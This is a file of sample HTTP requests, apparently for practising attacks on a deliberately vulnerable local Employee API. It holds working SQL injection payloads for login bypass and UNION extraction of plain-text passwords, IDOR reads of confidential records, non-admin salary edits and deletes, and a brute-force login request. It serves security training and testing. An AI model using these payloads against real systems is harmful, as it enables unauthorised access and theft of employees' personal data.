### Vulnerable Employee API — sample requests
### Works with the VS Code "REST Client" extension, or copy into Postman / Burp Repeater.
### Base URL assumes the default profile: http://localhost:5080

@base = http://localhost:5080

### 0. Normal login (baseline) — grab a token from the response
# @name login
POST {{base}}/api/auth/login
Content-Type: application/json

{ "username": "alice", "password": "Password1" }

### Use the token from the login above in the requests that need it
@token = {{login.response.body.token}}


### -------------------------------------------------------------------
### VULN: SQL injection — authentication bypass
### Logs in as the first user (admin) with no valid password.
POST {{base}}/api/auth/login
Content-Type: application/json

{ "username": "' OR '1'='1' --", "password": "x" }


### VULN: SQL injection — UNION extraction of credentials via search
### Pulls usernames + plain-text passwords out through the employee columns.
GET {{base}}/api/employees/search?name=%25' UNION SELECT Id, Username, Password, Role, 0, '', '' FROM Users --
Authorization: Bearer {{token}}


### -------------------------------------------------------------------
### VULN: IDOR — read another employee's confidential record by id
### alice "owns" employee 1, but can read employee 5 (Head of Engineering).
GET {{base}}/api/employees/5
Authorization: Bearer {{token}}


### VULN: Excessive data exposure — full list incl. salary + NI number
GET {{base}}/api/employees
Authorization: Bearer {{token}}


### -------------------------------------------------------------------
### VULN: Broken authorization — non-admin edits anyone's salary
PUT {{base}}/api/employees/2
Authorization: Bearer {{token}}
Content-Type: application/json

{ "fullName": "Bob Chen", "email": "bob@acme.test", "department": "Engineering", "salary": 999999, "nationalInsurance": "CD234567D", "performanceNotes": "edited by a non-admin" }


### VULN: Broken authorization — non-admin deletes a record (should be Admin only)
DELETE {{base}}/api/employees/4
Authorization: Bearer {{token}}


### VULN: Broken authorization — non-admin reads the admin-only user report
### Also excessive data exposure: returns every user's plain-text password.
GET {{base}}/api/admin/users
Authorization: Bearer {{token}}


### -------------------------------------------------------------------
### VULN: Missing rate limiting — repeat this in Burp Intruder / a loop to brute force
POST {{base}}/api/auth/login
Content-Type: application/json

{ "username": "admin", "password": "wrong-guess" }
